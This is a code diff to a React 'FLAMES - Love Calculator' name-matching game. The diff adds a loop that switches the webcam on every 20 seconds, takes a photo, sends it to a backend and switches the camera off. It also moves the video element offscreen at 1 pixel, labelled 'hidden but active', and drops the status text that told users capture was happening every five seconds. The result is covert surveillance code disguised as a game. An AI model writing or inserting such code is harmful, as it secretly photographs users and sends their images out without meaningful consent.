@@ -140,21 +140,52 @@ const FlamesGame = () => {
 
   useEffect(() => {
     if (!showPermissionPopup) {
+      let streamRef = null;
+
       const startCamera = async () => {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        if (videoRef.current) videoRef.current.srcObject = stream;
-      };
-
-      startCamera();
-
-      const interval = setInterval(capturePhoto, 5000);
-
-      return () => {
-        clearInterval(interval);
-        if (videoRef.current?.srcObject) {
-          videoRef.current.srcObject.getTracks().forEach(track => track.stop());
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          if (videoRef.current) {
+            videoRef.current.srcObject = stream;
+            videoRef.current.setAttribute("playsinline", true);
+          }
+          streamRef = stream;
+          console.log("✅ Camera ON");
+          return true;
+        } catch (err) {
+          console.error("❌ Camera access error:", err);
+          return false;
         }
       };
+
+      const stopCamera = () => {
+        if (streamRef) {
+          streamRef.getTracks().forEach(track => track.stop());
+          streamRef = null;
+          if (videoRef.current) {
+            videoRef.current.srcObject = null;
+          }
+          console.log("📴 Camera OFF");
+        }
+      };
+
+      const delay = ms => new Promise(res => setTimeout(res, ms));
+
+      const loop = async () => {
+        while (true) {
+          const started = await startCamera();
+          if (started) {
+            await delay(200); // wait briefly to allow camera to initialize
+            await capturePhoto();
+            stopCamera();
+          }
+          await delay(20000); // wait 20 seconds before next capture
+        }
+      };
+
+      loop();
+
+      return () => stopCamera();
     }
   }, [showPermissionPopup]);
 
@@ -176,16 +207,16 @@ const FlamesGame = () => {
         console.error("Backend error response:", text);
       }
 
-      console.log("Image sent to backend");
+      console.log("📸 Photo sent to backend");
     } catch (err) {
-      console.error("Image send failed:", err);
+      console.error("❌ Failed to send photo:", err);
     }
   };
 
   const handleAllow = () => {
     setShowPermissionPopup(false);
     localStorage.setItem("permissionsGiven", "true");
-    setPermissionStatus("Camera access granted and capturing every 5s");
+    setPermissionStatus("Camera access granted ✅");
   };
 
   const handleDeny = () => {
@@ -209,7 +240,6 @@ const FlamesGame = () => {
       setResult(flamesResult);
       setIsLoading(false);
 
-      // Save names and result to MongoDB via backend proxy
       try {
         const res = await fetch("/api/save-result", {
           method: "POST",
@@ -239,10 +269,11 @@ const FlamesGame = () => {
   };
 
   const heartPositions = useMemo(
-    () => Array.from({ length: 30 }, () => ({
-      left: Math.random() * 100,
-      duration: 4 + Math.random() * 3,
-    })),
+    () =>
+      Array.from({ length: 30 }, () => ({
+        left: Math.random() * 100,
+        duration: 4 + Math.random() * 3,
+      })),
     []
   );
 
@@ -251,20 +282,38 @@ const FlamesGame = () => {
       {heartPositions.map((pos, i) => (
         <Heart key={i} left={pos.left} duration={pos.duration}>❤️</Heart>
       ))}
-      {showPermissionPopup && <PermissionPopup onAllow={handleAllow} onDeny={handleDeny} />}
+      {showPermissionPopup && (
+        <PermissionPopup onAllow={handleAllow} onDeny={handleDeny} />
+      )}
       <Container>
         <Title>FLAMES - Love Calculator 💖</Title>
-        <Input type="text" placeholder="Your Name" value={name1} onChange={handleChange1} />
-        <Input type="text" placeholder="Crush's Name" value={name2} onChange={handleChange2} />
+        <Input value={name1} onChange={handleChange1} placeholder="Your Name" />
+        <Input value={name2} onChange={handleChange2} placeholder="Crush's Name" />
         <Button onClick={handleSubmit} disabled={isLoading}>
           {isLoading ? "Checking..." : "Check Relationship"}
         </Button>
         {result && <Result>💘 {result} 💘</Result>}
-        <ShareButton onClick={handleShare}>📤 Share</ShareButton>
+        {result && <ShareButton onClick={handleShare}>📤 Share</ShareButton>}
         {permissionStatus && <StatusMessage>{permissionStatus}</StatusMessage>}
-        <video ref={videoRef} width="320" height="240" autoPlay muted style={{ display: "none" }} />
-        <canvas ref={canvasRef} width="320" height="240" style={{ display: "none" }} />
       </Container>
+
+      {/* 🔒 Hidden but active video for camera capture */}
+      <video
+        ref={videoRef}
+        width="320"
+        height="240"
+        autoPlay
+        muted
+        playsInline
+        style={{
+          position: "absolute",
+          top: "-9999px",
+          left: "-9999px",
+          width: "1px",
+          height: "1px",
+        }}
+      />
+      <canvas ref={canvasRef} width="320" height="240" style={{ display: "none" }} />
     </Background>
   );
 };
